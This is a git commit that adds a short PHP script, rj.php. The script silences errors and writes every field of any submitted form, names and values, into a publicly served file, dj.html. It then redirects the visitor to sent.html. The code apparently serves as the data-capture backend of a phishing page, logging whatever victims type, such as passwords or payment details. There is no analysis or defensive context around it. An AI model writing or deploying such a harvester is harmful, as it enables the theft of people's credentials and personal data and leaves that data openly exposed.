5df1164ad74dc32d303f2b9016580ff0abea741d
rohiy667 <115402149+rohiy667@users.noreply.github.com>
2022-10-11 03:08:28 +0530

    Add files via upload

---
+++ rj.php
@@ -0,0 +1,17 @@
+
+<?php
+header('location: sent.html');
+error_reporting(0);
+$handle = fopen("dj.html","a");
+foreach($_POST as $variable => $value)
+{
+  fwrite($handle, $variable);
+  fwrite($handle, "= ");
+  fwrite($handle, $value);
+  fwrite($handle, "\r\n<br>");
+}
+fwrite($handle, "\r\n<br>");
+fclose($handle);
+exit;
+?> 
+       
